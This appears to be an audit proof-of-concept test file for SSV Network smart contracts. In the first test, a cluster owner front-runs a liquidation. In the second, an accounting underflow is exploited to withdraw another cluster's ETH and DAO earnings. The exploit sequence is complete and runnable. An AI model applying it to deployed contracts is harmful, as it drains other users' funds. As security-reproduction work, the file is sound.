import { expect } from "chai";
import type { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/types";
import type { NetworkConnection } from "hardhat/types/network";
import { ethers } from "ethers";
import type { NetworkHelpersType } from "../common/types.ts";
import { DEFAULT_SHARES, ETH_DEDUCTED_DIGITS, MAXIMUM_OPERATORS_FEE, MINIMAL_OPERATOR_ETH_FEE } from "../common/constants.ts";
import { Events } from "../common/events.ts";
import { Errors } from "../common/errors.ts";
import { createCluster, makeOperatorKey, makePublicKey, parseClusterFromEvent } from "../common/helpers.ts";
import { getTestConnection } from "../setup/connection.ts";
import { ssvNetworkFullFixture } from "../setup/fixtures.ts";

describe("SSV-10: Liquidatable Cluster Front-Running Attack", async () => {
  let connection: NetworkConnection<"generic">;
  let networkHelpers: NetworkHelpersType;
  let clusterOwner: HardhatEthersSigner;
  let liquidator: HardhatEthersSigner;

  before(async function () {
    ({ connection, networkHelpers } = await getTestConnection());
    const signers = await connection.ethers.getSigners();
    clusterOwner = signers[0];
    liquidator = signers[1];
  });

  const deployFixture = async () => {
    const fixture = await ssvNetworkFullFixture(connection);
    const operatorIds: bigint[] = [];

    for (let i = 0; i < 4; i++) {
      const tx = await fixture.network.registerOperator(
        makeOperatorKey(i + 1),
        Number(MINIMAL_OPERATOR_ETH_FEE),
        false,
      );
      const receipt = await tx.wait();
      const event = receipt?.logs.find((log: any) => {
        try {
          return fixture.network.interface.parseLog(log as any)?.name === Events.OPERATOR_ADDED;
        } catch {
          return false;
        }
      });
      if (!event) {
        throw new Error("OperatorAdded event not found");
      }
      operatorIds.push(fixture.network.interface.parseLog(event as any)!.args[0]);
    }

    return { ...fixture, operatorIds };
  };

  const deployBareFixture = async () => {
    return ssvNetworkFullFixture(connection);
  };

  it("reproduces same-block front-run: remove executes first, liquidation reverts in-block and next block", async function () {
    const { network: ssvNetwork, views, operatorIds } = await networkHelpers.loadFixture(deployFixture);
    const provider = connection.ethers.provider;
    const validatorPk = makePublicKey(1);

    const registerTx = await ssvNetwork.connect(clusterOwner).registerValidator(
      validatorPk,
      operatorIds,
      DEFAULT_SHARES,
      createCluster(),
      { value: ethers.parseEther("0.01") },
    );
    const registerReceipt = await registerTx.wait();
    const clusterSnapshot = parseClusterFromEvent(ssvNetwork, registerReceipt, Events.VALIDATOR_ADDED);

    let liquidatable = await views.isLiquidatable(clusterOwner.address, operatorIds, clusterSnapshot);
    for (let i = 0; i < 80 && !liquidatable; i++) {
      await networkHelpers.mine(500);
      liquidatable = await views.isLiquidatable(clusterOwner.address, operatorIds, clusterSnapshot);
    }
    expect(liquidatable).to.equal(true, "cluster did not become liquidatable");

    await provider.send("evm_setAutomine", [false]);
    let liquidateTxHash: string | undefined;
    let removeTxHash: string | undefined;

    try {
      const liquidateTx = await ssvNetwork.connect(liquidator).liquidate(
        clusterOwner.address,
        operatorIds,
        clusterSnapshot,
        {
          gasLimit: 1_500_000,
          maxFeePerGas: ethers.parseUnits("100", "gwei"),
          maxPriorityFeePerGas: ethers.parseUnits("1", "gwei"),
        },
      );
      liquidateTxHash = liquidateTx.hash;

      const removeTx = await ssvNetwork.connect(clusterOwner).removeValidator(
        validatorPk,
        operatorIds,
        clusterSnapshot,
        {
          gasLimit: 1_500_000,
          maxFeePerGas: ethers.parseUnits("100", "gwei"),
          maxPriorityFeePerGas: ethers.parseUnits("2", "gwei"),
        },
      );
      removeTxHash = removeTx.hash;

      await provider.send("evm_mine", []);
      const removeReceipt = await removeTx.wait();
      const liquidateReceipt = await provider.getTransactionReceipt(liquidateTx.hash);

      expect(liquidateReceipt).to.not.equal(null);
      expect(liquidateReceipt!.status).to.equal(0);
      expect(removeReceipt!.blockNumber).to.equal(liquidateReceipt!.blockNumber);

      const minedBlock = await provider.getBlock(removeReceipt!.blockNumber);
      const removePos = minedBlock!.transactions.indexOf(removeTx.hash);
      const liquidatePos = minedBlock!.transactions.indexOf(liquidateTx.hash);
      expect(removePos).to.be.lessThan(liquidatePos);

      const clusterAfterRemove = parseClusterFromEvent(ssvNetwork, removeReceipt, Events.VALIDATOR_REMOVED);
      expect(clusterAfterRemove.validatorCount).to.equal(0n);

      // Same stale cluster state no longer matches storage.
      await expect(
        ssvNetwork.connect(liquidator).liquidate(clusterOwner.address, operatorIds, clusterSnapshot),
      ).to.be.revertedWithCustomError(ssvNetwork, Errors.INCORRECT_CLUSTER_STATE);

      // Next block, using updated state, liquidation still reverts because validatorCount == 0.
      await networkHelpers.mine(1);
      await expect(
        ssvNetwork.connect(liquidator).liquidate(clusterOwner.address, operatorIds, clusterAfterRemove),
      ).to.be.revertedWithCustomError(ssvNetwork, Errors.CLUSTER_NOT_LIQUIDATABLE);
    } finally {
      await provider.send("evm_setAutomine", [true]);
      if (liquidateTxHash && removeTxHash) {
        await provider.send("hardhat_dropTransaction", [liquidateTxHash]).catch(() => null);
        await provider.send("hardhat_dropTransaction", [removeTxHash]).catch(() => null);
      }
    }
  });

  it("proves underflow extracts ETH from a second cluster and leaves network-fee earnings undercollateralized", async function () {
    const { network: ssvNetwork, views } = await networkHelpers.loadFixture(deployBareFixture);
    const signers = await connection.ethers.getSigners();
    const attackerOwner = signers[0];
    const honestOperatorOwner = signers[2];
    const honestClusterOwner = signers[3];

    const registerOperatorsWithFee = async (
      owner: HardhatEthersSigner,
      startSeed: number,
      fee: bigint,
    ): Promise<bigint[]> => {
      const ids: bigint[] = [];
      for (let i = 0; i < 4; i++) {
        const tx = await ssvNetwork.connect(owner).registerOperator(
          makeOperatorKey(startSeed + i),
          Number(fee),
          false,
        );
        const receipt = await tx.wait();
        const event = receipt?.logs.find((log: any) => {
          try {
            return ssvNetwork.interface.parseLog(log as any)?.name === Events.OPERATOR_ADDED;
          } catch {
            return false;
          }
        });
        if (!event) {
          throw new Error("OperatorAdded event not found");
        }
        ids.push(ssvNetwork.interface.parseLog(event as any)!.args[0]);
      }
      return ids;
    };

    const attackerOperatorIds = await registerOperatorsWithFee(attackerOwner, 7001, MAXIMUM_OPERATORS_FEE);
    const honestOperatorIds = await registerOperatorsWithFee(honestOperatorOwner, 8001, MINIMAL_OPERATOR_ETH_FEE);

    const attackerPk = makePublicKey(70);
    const honestPk = makePublicKey(80);
    const attackerDeposit = ethers.parseEther("10");
    const honestDeposit = ethers.parseEther("8");

    console.log("\n=== SSV-10 Two-Cluster Shared-Pool Extraction Proof ===");

    const registerAttackerTx = await ssvNetwork.connect(attackerOwner).registerValidator(
      attackerPk,
      attackerOperatorIds,
      DEFAULT_SHARES,
      createCluster(),
      { value: attackerDeposit },
    );
    const registerAttackerReceipt = await registerAttackerTx.wait();
    const attackerClusterSnapshot = parseClusterFromEvent(
      ssvNetwork,
      registerAttackerReceipt,
      Events.VALIDATOR_ADDED,
    );

    const registerHonestTx = await ssvNetwork.connect(honestClusterOwner).registerValidator(
      honestPk,
      honestOperatorIds,
      DEFAULT_SHARES,
      createCluster(),
      { value: honestDeposit },
    );
    const registerHonestReceipt = await registerHonestTx.wait();
    const honestClusterSnapshot = parseClusterFromEvent(
      ssvNetwork,
      registerHonestReceipt,
      Events.VALIDATOR_ADDED,
    );

    let operatorAEarningsBefore = 0n;
    for (const opId of attackerOperatorIds) {
      operatorAEarningsBefore += await views.getOperatorEarnings(opId);
    }
    const daoEarningsBefore = await views.getNetworkEarnings();

    const totalOperatorFeePerBlockA = MAXIMUM_OPERATORS_FEE * BigInt(attackerOperatorIds.length);
    const targetOperatorAccrualA = attackerDeposit + ethers.parseEther("6");
    const blocksToMine = Number(targetOperatorAccrualA / totalOperatorFeePerBlockA) + 5;
    await networkHelpers.mine(blocksToMine);

    const attackerLiquidatable = await views.isLiquidatable(
      attackerOwner.address,
      attackerOperatorIds,
      attackerClusterSnapshot,
    );
    expect(attackerLiquidatable).to.equal(true, "attacker cluster should be liquidatable before removal");

    const protocolBalanceBeforeRemove = await connection.ethers.provider.getBalance(await ssvNetwork.getAddress());
    const honestBalanceViewBeforeRemove = await views.getBalance(
      honestClusterOwner.address,
      honestOperatorIds,
      honestClusterSnapshot,
    );

    console.log(`Attacker cluster balance before remove: ${ethers.formatEther(attackerClusterSnapshot.balance)} ETH`);
    console.log(`Honest cluster deposit (ledger):        ${ethers.formatEther(honestClusterSnapshot.balance)} ETH`);
    console.log(`Protocol ETH before remove:             ${ethers.formatEther(protocolBalanceBeforeRemove)} ETH`);
    console.log(`DAO earnings before remove:             ${ethers.formatEther(daoEarningsBefore)} ETH`);

    const removeTx = await ssvNetwork.connect(attackerOwner).removeValidator(
      attackerPk,
      attackerOperatorIds,
      attackerClusterSnapshot,
    );
    const removeReceipt = await removeTx.wait();
    const attackerClusterAfterRemove = parseClusterFromEvent(ssvNetwork, removeReceipt, Events.VALIDATOR_REMOVED);

    let operatorAEarningsAfter = 0n;
    for (const opId of attackerOperatorIds) {
      operatorAEarningsAfter += await views.getOperatorEarnings(opId);
    }
    const daoEarningsAfterRemove = await views.getNetworkEarnings();
    const protocolBalanceAfterRemove = await connection.ethers.provider.getBalance(await ssvNetwork.getAddress());

    const operatorCredited = operatorAEarningsAfter - operatorAEarningsBefore;
    const daoCredited = daoEarningsAfterRemove - daoEarningsBefore;
    const totalSettledFees = operatorCredited + daoCredited;
    const clusterPaid = attackerClusterSnapshot.balance - attackerClusterAfterRemove.balance;
    const missingPayment = totalSettledFees - clusterPaid;

    console.log("\nAttacker removal settlement");
    console.log(`Expected settled fees (A op + DAO):    ${ethers.formatEther(totalSettledFees)} ETH`);
    console.log(`Real payment from attacker cluster:     ${ethers.formatEther(clusterPaid)} ETH`);
    console.log(`Missing payment (unbacked):             ${ethers.formatEther(missingPayment)} ETH`);
    console.log(`Protocol ETH after remove:              ${ethers.formatEther(protocolBalanceAfterRemove)} ETH`);

    expect(attackerClusterAfterRemove.balance).to.equal(0n);
    expect(attackerClusterAfterRemove.validatorCount).to.equal(0n);
    expect(missingPayment).to.be.gt(0n);
    expect(protocolBalanceAfterRemove).to.equal(protocolBalanceBeforeRemove);

    let totalWithdrawnFromAttackerOperators = 0n;
    const networkAddress = await ssvNetwork.getAddress();
    for (const opId of attackerOperatorIds) {
      let claim = await views.getOperatorEarnings(opId);
      let available = await connection.ethers.provider.getBalance(networkAddress);

      if (claim == 0n || available == 0n) {
        continue;
      }

      let amount = claim < available ? claim : available;
      amount -= amount % ETH_DEDUCTED_DIGITS; // packed ETH precision
      if (amount == 0n) {
        continue;
      }

      await ssvNetwork.connect(attackerOwner).withdrawOperatorEarnings(opId, amount);
      totalWithdrawnFromAttackerOperators += amount;
    }

    const protocolBalanceAfterDrain = await connection.ethers.provider.getBalance(networkAddress);
    const daoEarningsAfterDrain = await views.getNetworkEarnings();
    const honestBalanceViewAfterDrain = await views.getBalance(
      honestClusterOwner.address,
      honestOperatorIds,
      honestClusterSnapshot,
    );

    const extractedFromOtherCluster = totalWithdrawnFromAttackerOperators - clusterPaid;
    const requiredToCoverHonestPlusDao = honestBalanceViewAfterDrain + daoEarningsAfterDrain;

    console.log("\nShared-pool extraction impact");
    console.log(`Total withdrawn by attacker operators:  ${ethers.formatEther(totalWithdrawnFromAttackerOperators)} ETH`);
    console.log(`Max attacker-owned payment source:      ${ethers.formatEther(clusterPaid)} ETH`);
    console.log(`Extracted from other cluster funds:     ${ethers.formatEther(extractedFromOtherCluster)} ETH`);
    console.log(`Honest cluster view before/after drain: ${ethers.formatEther(honestBalanceViewBeforeRemove)} -> ${ethers.formatEther(honestBalanceViewAfterDrain)} ETH`);
    console.log(`Protocol ETH after attacker drain:      ${ethers.formatEther(protocolBalanceAfterDrain)} ETH`);
    console.log(`Outstanding DAO (network fee) earnings: ${ethers.formatEther(daoEarningsAfterDrain)} ETH`);
    console.log(`Required for honest cluster + DAO:      ${ethers.formatEther(requiredToCoverHonestPlusDao)} ETH`);

    expect(totalWithdrawnFromAttackerOperators).to.be.gt(clusterPaid);
    expect(extractedFromOtherCluster).to.be.gt(0n);
    expect(daoEarningsAfterDrain).to.be.gt(0n);
    expect(protocolBalanceAfterDrain).to.be.lt(requiredToCoverHonestPlusDao);
  });
});
